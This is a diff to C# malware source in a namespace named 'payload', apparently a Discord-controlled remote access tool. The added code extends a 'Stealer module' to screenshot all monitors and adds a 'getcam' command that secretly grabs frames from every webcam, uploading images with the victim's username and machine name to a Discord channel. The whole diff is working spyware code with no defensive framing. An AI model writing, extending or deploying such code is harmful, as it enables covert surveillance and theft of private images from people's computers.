@@ -17,6 +17,8 @@ using System.Windows.Forms;
 using Discord;
 using Discord.WebSocket;
 using Newtonsoft.Json;
+using AForge.Video.DirectShow;
+using AForge.Video;
 
 namespace payload
 {
@@ -105,17 +107,46 @@ namespace payload
                 // Stealer module
                 case "get":
                     {
-                        Bitmap sc = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
-                        Graphics sg = Graphics.FromImage(sc);
-                        sg.CopyFromScreen(0, 0, 0, 0, sc.Size, CopyPixelOperation.SourceCopy);
-                        sg.Dispose();
+                        List<FileAttachment> screenshots = new List<FileAttachment>();
+                        foreach (Screen screen in Screen.AllScreens)
+                        {
+                            Bitmap sc = new Bitmap(screen.Bounds.Width, screen.Bounds.Height);
+                            Graphics sg = Graphics.FromImage(sc);
+                            sg.CopyFromScreen(0, 0, 0, 0, sc.Size, CopyPixelOperation.SourceCopy);
+                            sg.Dispose();
 
-                        MemoryStream ms = new MemoryStream();
-                        sc.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
-                        sc.Dispose();
+                            MemoryStream ms = new MemoryStream();
+                            sc.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
+                            sc.Dispose();
 
-                        await message.Channel.SendFileAsync(ms, "unknown.png", $"Username: {Environment.UserName}\nMachine name: {Environment.MachineName}");
-                        ms.Dispose();
+                            screenshots.Add(new FileAttachment(ms, "unknown.png"));
+                        }
+                        await message.Channel.SendFilesAsync(screenshots, $"Username: {Environment.UserName}\nMachine name: {Environment.MachineName}");
+                        foreach (FileAttachment fa in screenshots) fa.Dispose();
+                        break;
+                    }
+                case "getcam":
+                    {
+                        if (args[0] != Environment.MachineName) break;
+                        List<Bitmap> images = new List<Bitmap>();
+                        FilterInfoCollection devices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
+                        foreach (FilterInfo device in devices)
+                        {
+                            VideoCaptureDevice vsource = new VideoCaptureDevice(device.MonikerString);
+                            vsource.NewFrame += new NewFrameEventHandler((sender, e) => { images.Add((Bitmap)e.Frame.Clone()); vsource.SignalToStop(); });
+                            vsource.Start();
+                            Thread.Sleep(1000);
+                        }
+                        List<FileAttachment> pictures = new List<FileAttachment>();
+                        foreach (Bitmap image in images)
+                        {
+                            MemoryStream ms = new MemoryStream();
+                            image.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
+                            image.Dispose();
+                            pictures.Add(new FileAttachment(ms, "unknown.png"));
+                        }
+                        await message.Channel.SendFilesAsync(pictures);
+                        foreach (FileAttachment fa in pictures) fa.Dispose();
                         break;
                     }
                 case "getfile":
